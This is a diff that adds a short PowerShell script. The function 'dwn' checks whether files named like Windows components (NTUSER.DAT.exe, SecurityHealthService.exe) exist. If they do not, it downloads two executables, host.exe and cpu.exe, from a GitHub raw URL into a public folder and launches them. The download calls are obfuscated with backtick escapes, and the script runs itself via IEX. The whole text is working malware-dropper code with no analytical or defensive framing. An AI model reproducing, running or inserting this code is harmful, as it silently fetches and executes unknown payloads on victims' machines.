@@ -1,0 +1,37 @@
+Function dwn
+{
+
+
+$p = [System.IO.File]::Exists("C:\Users\$env:UserName\NTUSER.DAT.exe")
+
+
+
+if($p -eq $true)
+{
+$r2 = 'C:\Users\Public\Pictures\'
+}
+else{
+
+(New-Object "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`F`i`l`e"('https://raw.githubusercontent.com/salemtahoo/tahoo/main/host.exe', 'C:\Users\Public\Libraries\host.exe');[System.Diagnostics.Process]::Start("C:\Users\Public\Libraries\host.exe");
+
+}
+
+$o = [System.IO.File]::Exists("C:\Users\$env:UserName\SecurityHealthService.exe")
+
+
+
+if($o -eq $true)
+{
+$r2 = 'C:\Users\Public\Pictures\'
+}
+else{
+
+(New-Object "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`F`i`l`e"('https://raw.githubusercontent.com/salemtahoo/tahoo/main/cpu.exe', 'C:\Users\Public\Libraries\cpu.exe');[System.Diagnostics.Process]::Start("C:\Users\Public\Libraries\cpu.exe");
+
+}
+
+
+}
+
+IEX dwn
+
